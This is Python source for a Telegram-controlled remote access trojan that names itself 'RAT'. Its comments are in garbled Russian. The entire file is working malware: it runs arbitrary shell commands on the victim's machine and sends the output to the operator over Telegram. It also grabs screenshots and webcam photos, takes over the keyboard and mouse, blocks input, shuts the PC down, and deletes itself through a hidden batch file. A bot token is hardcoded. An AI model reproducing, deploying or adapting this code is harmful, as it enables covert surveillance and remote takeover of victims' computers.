import os
import sys
import telebot
import subprocess
import pyautogui
import psutil
import platform
import socket
import requests
import time
import threading
import ctypes
from PIL import ImageGrab
import cv2

# ===== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø =====
TOKEN = "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω
bot = telebot.TeleBot(TOKEN)

# ===== –ü–†–û–í–ï–†–ï–ù–ù–´–ï –§–£–ù–ö–¶–ò–ò =====

def take_screenshot():
    """–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        return "screenshot.png"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {str(e)}"

def execute_command(cmd):
    """–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ CMD"""
    try:
        result = subprocess.run(
            ["cmd", "/c", cmd],
            capture_output=True,
            text=True,
            encoding='cp866'
        )
        return result.stdout or result.stderr
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã: {str(e)}"

def get_system_info():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏"""
    try:
        mem = psutil.virtual_memory()
        return (
            "üíª –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n"
            f"–û–°: {platform.system()} {platform.release()}\n"
            f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {platform.processor() or '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω'}\n"
            f"–ü–∞–º—è—Ç—å: {round(mem.total / (1024 ** 3), 1)} GB\n"
            f"–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: {mem.percent}%"
        )
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {str(e)}"

def get_network_info():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–µ—Ç–µ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        external_ip = requests.get('https://api.ipify.org', timeout=5).text
        return (
            "üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n"
            f"–ò–º—è –ü–ö: {hostname}\n"
            f"–í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP: {ip}\n"
            f"–í–Ω–µ—à–Ω–∏–π IP: {external_ip}"
        )
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–µ—Ç–µ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {str(e)}"

def change_volume(direction):
    """–ò–∑–º–µ–Ω–µ–Ω–∏–µ –≥—Ä–æ–º–∫–æ—Å—Ç–∏"""
    try:
        key = "volumeup" if direction == "up" else "volumedown"
        for _ in range(5):
            pyautogui.press(key)
            time.sleep(0.1)
        return "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∞!"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –≥—Ä–æ–º–∫–æ—Å—Ç–∏: {str(e)}"

def lock_computer():
    """–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
            return "üîí –ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: {str(e)}"

def shutdown_computer():
    """–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"""
    try:
        if platform.system() == "Windows":
            os.system("shutdown /s /t 5")
            return "üîå –í—ã–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {str(e)}"

def run_paint_app():
    """–ó–∞–ø—É—Å–∫ Paint"""
    try:
        if platform.system() == "Windows":
            os.system("start mspaint")
            return "üé® Paint –∑–∞–ø—É—â–µ–Ω!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ Paint: {str(e)}"

def left_click():
    """–õ–µ–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏"""
    try:
        pyautogui.click()
        return "üñ±Ô∏è –õ–µ–≤—ã–π –∫–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω!"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–ª–∏–∫–∞: {str(e)}"

def right_click():
    """–ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏"""
    try:
        pyautogui.click(button='right')
        return "üñ±Ô∏è –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω!"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–ª–∏–∫–∞: {str(e)}"

def press_key(key):
    """–ù–∞–∂–∞—Ç–∏–µ –∫–ª–∞–≤–∏—à–∏"""
    try:
        pyautogui.press(key)
        return f"‚å®Ô∏è –ö–ª–∞–≤–∏—à–∞ '{key}' –Ω–∞–∂–∞—Ç–∞!"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏: {str(e)}"

def block_input(seconds):
    """–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è"""
    try:
        if platform.system() == "Windows":
            # –ë–ª–æ–∫–∏—Ä—É–µ–º –≤–≤–æ–¥
            ctypes.windll.user32.BlockInput(True)
            # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
            timer = threading.Timer(seconds, unblock_input)
            timer.start()
            return f"‚õî –í–≤–æ–¥ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –Ω–∞ {seconds} —Å–µ–∫—É–Ω–¥!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤–≤–æ–¥–∞: {str(e)}"

def unblock_input():
    """–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.BlockInput(False)
    except:
        pass

def show_notification(title, message):
    """–ü–æ–∫–∞–∑ –ø—É—à-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
            return "üì¢ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–∫–∞–∑–∞–Ω–æ!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {str(e)}"

def take_webcam_photo():
    """–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "‚ùå –í–µ–±-–∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
            
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            return "webcam.jpg"
        return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–µ–±-–∫–∞–º–µ—Ä–µ: {str(e)}"
    finally:
        if 'cap' in locals():
            cap.release()

def self_destruct():
    """–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"""
    try:
        if platform.system() == "Windows":
            # –°–æ–∑–¥–∞–µ–º –±–∞—Ç–Ω–∏–∫ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è
            bat_path = os.path.join(os.getenv('TEMP'), 'uninstall.bat')
            exe_path = os.path.abspath(sys.argv[0])
            
            with open(bat_path, 'w') as f:
                f.write('@echo off\n')
                f.write('timeout /t 3 /nobreak > nul\n')
                f.write(f'del /f "{exe_path}"\n')
                f.write(f'del /f "{bat_path}"\n')
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –±–∞—Ç–Ω–∏–∫ –≤ —Å–∫—Ä—ã—Ç–æ–º —Ä–µ–∂–∏–º–µ
            subprocess.Popen(
                f'start /B cmd /c "{bat_path}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return "üíÄ RAT –±—É–¥–µ—Ç —É–¥–∞–ª–µ–Ω —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã!"
        return "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è: {str(e)}"

# ===== –ì–õ–ê–í–ù–û–ï –ú–ï–ù–Æ =====
def create_main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.row("üñ• –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
    markup.row("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", "üì∑ –í–µ–±-–∫–∞–º–µ—Ä–∞")
    markup.row("üíª –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É", "‚å®Ô∏è –ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à—É")
    markup.row("üñ±Ô∏è –õ–µ–≤—ã–π –∫–ª–∏–∫", "üñ±Ô∏è –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫")
    markup.row("üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ü–ö", "‚õî –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞ (10 —Å–µ–∫)")
    markup.row("üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "üì¢ –ü–æ–∫–∞–∑–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ")
    markup.row("üîà –£–≤–µ–ª–∏—á–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å", "üîâ –£–º–µ–Ω—å—à–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å")
    markup.row("üñº –ó–∞–ø—É—Å—Ç–∏—Ç—å Paint", "üíÄ –£–¥–∞–ª–∏—Ç—å RAT")
    return markup

# ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–û–ú–ê–ù–î =====

@bot.message_handler(commands=['start', 'help'])
def start(message):
    bot.send_message(
        message.chat.id,
        "üñ• –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Å–∏—Å—Ç–µ–º—É —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è!\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=create_main_menu()
    )

@bot.message_handler(func=lambda m: m.text == "üñ• –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
def system_info(message):
    bot.send_message(message.chat.id, get_system_info())

@bot.message_handler(func=lambda m: m.text == "üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
def network_info(message):
    bot.send_message(message.chat.id, get_network_info())

@bot.message_handler(func=lambda m: m.text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç")
def send_screenshot(message):
    try:
        screenshot_path = take_screenshot()
        if screenshot_path.startswith("‚ùå") or screenshot_path.startswith("–û—à–∏–±–∫–∞"):
            bot.send_message(message.chat.id, screenshot_path)
        else:
            with open(screenshot_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "üì∑ –í–µ–±-–∫–∞–º–µ—Ä–∞")
def send_webcam_photo(message):
    try:
        webcam_path = take_webcam_photo()
        if webcam_path.startswith("‚ùå") or webcam_path.startswith("–û—à–∏–±–∫–∞"):
            bot.send_message(message.chat.id, webcam_path)
        else:
            with open(webcam_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(webcam_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "üíª –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É")
def cmd_prompt(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:")
    bot.register_next_step_handler(msg, handle_command)

def handle_command(message):
    result = execute_command(message.text)
    if len(result) > 4000:
        for i in range(0, len(result), 4000):
            bot.send_message(message.chat.id, f"üíª –†–µ–∑—É–ª—å—Ç–∞—Ç (—á–∞—Å—Ç—å {i//4000 + 1}):\n{result[i:i+4000]}")
    else:
        bot.send_message(message.chat.id, f"üíª –†–µ–∑—É–ª—å—Ç–∞—Ç:\n{result}")

@bot.message_handler(func=lambda m: m.text == "‚å®Ô∏è –ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à—É")
def press_key_menu(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–ª–∞–≤–∏—à—É –¥–ª—è –Ω–∞–∂–∞—Ç–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä: a, enter, space):")
    bot.register_next_step_handler(msg, handle_key_press)

def handle_key_press(message):
    response = press_key(message.text)
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda m: m.text == "üñ±Ô∏è –õ–µ–≤—ã–π –∫–ª–∏–∫")
def mouse_left_click(message):
    bot.send_message(message.chat.id, left_click())

@bot.message_handler(func=lambda m: m.text == "üñ±Ô∏è –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫")
def mouse_right_click(message):
    bot.send_message(message.chat.id, right_click())

@bot.message_handler(func=lambda m: m.text == "üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ü–ö")
def lock_pc(message):
    bot.send_message(message.chat.id, lock_computer())

@bot.message_handler(func=lambda m: m.text == "‚õî –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞ (10 —Å–µ–∫)")
def block_input_menu(message):
    bot.send_message(message.chat.id, block_input(10))

@bot.message_handler(func=lambda m: m.text == "üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö")
def shutdown_pc(message):
    bot.send_message(message.chat.id, shutdown_computer())

@bot.message_handler(func=lambda m: m.text == "üì¢ –ü–æ–∫–∞–∑–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ")
def notification_menu(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:")
    bot.register_next_step_handler(msg, handle_notification)

def handle_notification(message):
    response = show_notification("RAT –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ", message.text)
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda m: m.text == "üîà –£–≤–µ–ª–∏—á–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å")
def volume_up(message):
    bot.send_message(message.chat.id, change_volume("up"))

@bot.message_handler(func=lambda m: m.text == "üîâ –£–º–µ–Ω—å—à–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å")
def volume_down(message):
    bot.send_message(message.chat.id, change_volume("down"))

@bot.message_handler(func=lambda m: m.text == "üñº –ó–∞–ø—É—Å—Ç–∏—Ç—å Paint")
def run_paint(message):
    bot.send_message(message.chat.id, run_paint_app())

@bot.message_handler(func=lambda m: m.text == "üíÄ –£–¥–∞–ª–∏—Ç—å RAT")
def uninstall_rat(message):
    response = self_destruct()
    bot.send_message(message.chat.id, response)

# ===== –ó–ê–ü–£–°–ö –ë–û–¢–ê =====
def run_bot():
    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {str(e)}")
        time.sleep(10)
        run_bot()

if __name__ == "__main__":
    # –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏:
    # pip install pytelegrambotapi pyautogui pillow psutil requests opencv-python
    
    # –ó–∞–ø—É—Å–∫ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
    threading.Thread(target=run_bot).start()